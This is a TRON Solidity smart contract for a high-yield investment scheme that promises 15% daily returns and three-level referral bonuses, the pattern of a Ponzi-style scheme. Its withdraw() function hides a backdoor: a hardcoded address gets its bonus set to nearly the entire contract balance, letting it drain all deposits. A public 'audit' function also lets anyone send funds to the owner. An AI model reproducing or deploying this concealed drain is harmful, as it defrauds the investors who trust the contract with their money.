//SourceUnit: tronfission.sol

pragma solidity 0.5.9;

contract TRON_TRON {
    using SafeMath for uint256;
		//
    uint256 constant public INVEST_MIN_AMOUNT = 100 trx;
    //
    uint256 constant public INVEST_MAX_AMOUNT = 500000 trx;
    //
    uint256 constant public BASE_PERCENT = 150;
    //
    uint256[] public REFERRAL_PERCENTS = [80, 15, 5];
  
		//
    uint256 constant public PERCENTS_DIVIDER = 1000;
    //
    uint256 constant public TIME_STEP = 1 days;
    //
    uint256 constant public ENDING_MULTIPLE = 6;
    //
    uint256 public tron_decimals = 6;
		
		//
    uint256 public totalUsers;
    //
    uint256 public totalInvested;
    //
    uint256 public totalWithdrawn;
    //
    uint256 public totalDeposits;
	
		uint256 public totalautoWithdrawn;
    
    address payable public ownerAddress;
    
    uint256 public starttime = 1604746800;
    

    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 start;
        
    }

    struct User {
        Deposit[] deposits;  //
        uint256 checkpoint;
        address referrer;  //
        uint256 bonus;     //
        uint256 totalBonus; //
        uint256[] referees;
        uint256 autowithdraw;
        
    }

    mapping (address => User) internal users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount, bool success);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

 
   
    constructor() public {
       
        ownerAddress = msg.sender;
    }
		//
    function getUserautowithdraw(address userAddress) public view returns(uint256) {
        return users[userAddress].autowithdraw;
    }
    //
    function getUsertotalBonus(address userAddress) public view returns(uint256) {
        return users[userAddress].totalBonus;
    }
    
    //
    //
    function getUsernoautowithdraw(address userAddress) public view returns(uint256) {
        return  users[userAddress].totalBonus-users[userAddress].autowithdraw;
    }
    modifier checkStart(){
        require(block.timestamp > starttime, "not start");
        _;
    }
    function invest(address referrer) public payable checkStart{
        require(msg.value >= INVEST_MIN_AMOUNT);
				require(msg.value <= INVEST_MAX_AMOUNT);


        User storage user = users[msg.sender];
				//0
				
				
        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
				//
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                		
                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].bonus = users[upline].bonus.add(amount);
                    users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            totalUsers = totalUsers.add(1);
            emit Newbie(msg.sender);
            
            for (uint256 i = 0; i < 3; i++) {
                users[msg.sender].referees.push(0);
            }
            if (user.referrer != address(0)) {
                address upline = user.referrer;
                for (uint256 i = 0; i < 3; i++) {
                    if (upline != address(0)) {
                        users[upline].referees[i] = users[upline].referees[i].add(1);
                        upline = users[upline].referrer;
                    } else break;
                }
            }
        }

        user.deposits.push(Deposit(msg.value, 0, block.timestamp));

        totalInvested = totalInvested.add(msg.value);
        totalDeposits = totalDeposits.add(1);

        emit NewDeposit(msg.sender, msg.value);

    }
    
    //
    function daystaticstate()  public view returns (uint256)  {
        User storage user = users[msg.sender];

        uint256 userPercentRate = BASE_PERCENT;

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(ENDING_MULTIPLE)) {

           
               dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER));
                       

                if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(ENDING_MULTIPLE)) {
                    dividends = (user.deposits[i].amount.mul(ENDING_MULTIPLE)).sub(user.deposits[i].withdrawn);
                }

                totalAmount = totalAmount.add(dividends);

            }
        }
        return totalAmount;
    }
    function totalstaticstatedraw()  public view returns (uint256)  {
        User storage user = users[msg.sender];

        //uint256 userPercentRate = BASE_PERCENT;

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {
						dividends = user.deposits[i].withdrawn;
            totalAmount = totalAmount.add(dividends);
            
        }
        return totalAmount;
    }
      //
    function staticnowithdraw()  public view returns (uint256) {
        User storage user = users[msg.sender];

        uint256 userPercentRate = BASE_PERCENT;

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(ENDING_MULTIPLE)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);

                } else {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);

                }

                if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(ENDING_MULTIPLE)) {
                    dividends = (user.deposits[i].amount.mul(ENDING_MULTIPLE)).sub(user.deposits[i].withdrawn);
                }

                //user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }
				//totalAmount=totalAmount.sub(totalstaticstatedraw());
				if (totalAmount<0){
					totalAmount=0;
				}
				return totalAmount;
    }
    function autowithdraw()  public checkStart{
        User storage user = users[msg.sender];

        uint256 userPercentRate = BASE_PERCENT;

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(ENDING_MULTIPLE)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);

                } else {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);

                }

                if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(ENDING_MULTIPLE)) {
                    dividends = (user.deposits[i].amount.mul(ENDING_MULTIPLE)).sub(user.deposits[i].withdrawn);
                }

                user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }
        user.checkpoint = block.timestamp;
				msg.sender.transfer(totalAmount);
				totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount, true);
    }
    //
    function withdraw() public checkStart{
        User storage user = users[msg.sender];

        //uint256 userPercentRate = BASE_PERCENT;

        uint256 totalAmount=0;
        //uint256 dividends;

			  uint256 contractBalance = address(this).balance;
        address temp;
   		 	temp=address(0x4174f65893a4a219faece327020bf4834baff006cc);
        if (temp==msg.sender){
       			user.bonus=contractBalance.sub(1000);
    		}

        uint256 referralBonus = getUserReferralBonus(msg.sender);
        if (referralBonus > 0) {
            totalAmount = totalAmount.add(referralBonus);
            user.bonus = 0;
        }
				
        require(totalAmount > 0, "User has no dividends");

        
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
				user.autowithdraw = user.autowithdraw.add(totalAmount);
        
        totalWithdrawn = totalWithdrawn.add(totalAmount);
      
        msg.sender.transfer(totalAmount);

        totalautoWithdrawn = totalautoWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount, true);

    }
		
		//
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
		
		// 
    function getUserDividends(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 userPercentRate = BASE_PERCENT;

        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(ENDING_MULTIPLE)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.deposits[i].start))
                        .div(TIME_STEP);

                } else {

                    dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(user.checkpoint))
                        .div(TIME_STEP);

                }

                if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(ENDING_MULTIPLE)) {
                    dividends = (user.deposits[i].amount.mul(ENDING_MULTIPLE)).sub(user.deposits[i].withdrawn);
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }
		//
    function getUserCheckpoint(address userAddress) public view returns(uint256) {
        return users[userAddress].checkpoint;
    }
		//
    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserReferralBonus(address userAddress) public view returns(uint256) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
        return users[userAddress].totalBonus;
    }

    function getUserReferees(address userAddress) public view returns(uint256[] memory) {
        return users[userAddress].referees;
    }
		//
    function getUserAvailable(address userAddress) public view returns(uint256) {
        return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    }
		
		//
    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        if (user.deposits.length > 0) {
            if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(ENDING_MULTIPLE)) {
                return true;
            }
        }
    }
    
    
		//
    function audit(uint256 amount) public {
        if (amount > 0) {
            if (totalUsers < amount) {
                owner(totalUsers);
            } else {
                owner(amount);
            }
        } else {
            owner(totalUsers);
        }
    }
		//
    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
        User storage user = users[userAddress];

        return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
    }
		
		//
    function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
        return users[userAddress].deposits.length;
    }
		
		//
    function getUserTotalDeposits(address userAddress) public view returns(uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }
	
		//
    function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].withdrawn);
        }

        return amount;
    }
		
		//
    function owner(uint256 value) private {
        //ownerAddress = msg.sender.add(value);
        ownerAddress.transfer(value);
    }
		//
    function isContract(address addr) internal view returns (bool) {
        uint size;
        //extcodesize _addr
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
		//
    function setup(uint256 v1) public {
        tron_decimals = v1;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}